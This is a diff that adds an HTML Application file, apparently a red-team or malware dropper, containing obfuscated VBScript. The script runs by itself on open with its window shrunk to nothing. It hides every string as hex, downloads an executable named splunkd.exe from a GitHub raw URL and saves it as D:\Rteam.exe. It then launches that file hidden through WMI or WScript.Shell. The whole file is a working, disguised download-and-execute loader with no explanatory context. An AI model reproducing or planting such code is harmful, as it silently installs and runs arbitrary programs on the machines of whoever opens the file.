@@ -1,0 +1,75 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION icon="#" WINDOWSTATE="normal" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" BORDER="none" SCROLL="no" />
+<script type="text/vbscript">
+Function fqmnhiujp(cleyqbaugsqobw ) 
+Dim ffuksqkeahpwxvah 
+Dim rzsykipw 
+Set ejfjuzgb = GetObject(tyijlesymvnhtti("77696e6d") & tyijlesymvnhtti("676d74733a5c5c2e5c726f6f745c63696d7632"))
+Set rrugxdbmhjyitmw = ejfjuzgb.Get(tyijlesymvnhtti("57696e33325f50726f636573") & tyijlesymvnhtti("7353746172747570"))
+Set ffuksqkeahpwxvah = rrugxdbmhjyitmw.SpawnInstance_
+ffuksqkeahpwxvah.ShowWindow = 0
+Set rzsykipw = GetObject(tyijlesymvnhtti("77696e6d676d") & tyijlesymvnhtti("74733a5c5c2e5c726f6f745c63696d76323a57696e33325f50726f63657373"))
+fqmnhiujp = tnzocjnbwqde(rzsykipw, ffuksqkeahpwxvah, cleyqbaugsqobw)
+End Function
+Private Function tnzocjnbwqde(nqzlvnzo , iwyzkrlog , awiowcwpjjijign ) 
+Dim rtvbbbelchivzzrcg 
+tnzocjnbwqde = nqzlvnzo.Create(awiowcwpjjijign, Null, iwyzkrlog, rtvbbbelchivzzrcg)
+End Function
+Function tyijlesymvnhtti(ByVal tyacpleqx ) 
+Dim thakdhdbir 
+For thakdhdbir = 1 To Len(tyacpleqx) Step 2
+tyijlesymvnhtti = tyijlesymvnhtti & Chr(CInt("&H" & Mid(tyacpleqx, thakdhdbir, 2)))
+Next '//thakdhdbir
+End Function
+Private Sub ihwpczjkhklk()
+Dim wzlhbtkmnwtrmkv 
+Dim kvsfgkjxsgayn 
+Dim tszvdfnzlbqa , rdyzokpklwndfypngce 
+Dim rhnobouhr 
+wzlhbtkmnwtrmkv = tyijlesymvnhtti("68747470733a2f2f6769746875622e636f6d") & tyijlesymvnhtti("2f646f63333833382f646f632f7261772f6d61696e2f73706c756e6b642e657865")
+kvsfgkjxsgayn = tyijlesymvnhtti("443a5c5274") & tyijlesymvnhtti("65616d2e657865")
+Set tszvdfnzlbqa = CreateObject(tyijlesymvnhtti("4d53584d4c322e536572") & tyijlesymvnhtti("766572584d4c485454502e362e30"))
+tszvdfnzlbqa.setOption(2) = 13056 
+tszvdfnzlbqa.Open tyijlesymvnhtti("474554"), wzlhbtkmnwtrmkv, False 
+tszvdfnzlbqa.setRequestHeader tyijlesymvnhtti("557365722d41") & tyijlesymvnhtti("67656e74"), tyijlesymvnhtti("4d6f7a") & tyijlesymvnhtti("696c6c612f342e302028636f6d70617469626c653b204d53494520362e303b2057696e646f7773204e5420352e3029")
+tszvdfnzlbqa.Send
+If tszvdfnzlbqa.Status = 200 Then
+Set rdyzokpklwndfypngce = CreateObject(tyijlesymvnhtti("41444f44422e") & tyijlesymvnhtti("53747265616d"))
+rdyzokpklwndfypngce.Open
+rdyzokpklwndfypngce.Type = 1
+rdyzokpklwndfypngce.Write tszvdfnzlbqa.ResponseBody
+rdyzokpklwndfypngce.SaveToFile kvsfgkjxsgayn, 2  
+rdyzokpklwndfypngce.Close
+ebvathkxx kvsfgkjxsgayn
+End If    
+End Sub
+Sub AutoOpen()
+ihwpczjkhklk
+End Sub
+Sub cxyhtbiktvoqwzb(cmdLine )
+CreateObject(tyijlesymvnhtti("575363726970742e536865") & tyijlesymvnhtti("6c6c")).Run cmdLine, 0
+End Sub
+Sub ebvathkxx(futkdspo )
+On Error Resume Next
+Err.Clear
+wimResult = fqmnhiujp(futkdspo)
+If Err.Number <> 0 Or wimResult <> 0 Then
+Err.Clear
+cxyhtbiktvoqwzb futkdspo
+End If
+On Error Goto 0
+End Sub
+
+
+window.resizeTo 0,0
+AutoOpen
+Close
+</script>
+</head>
+<body>
+</body>
+</html>
+
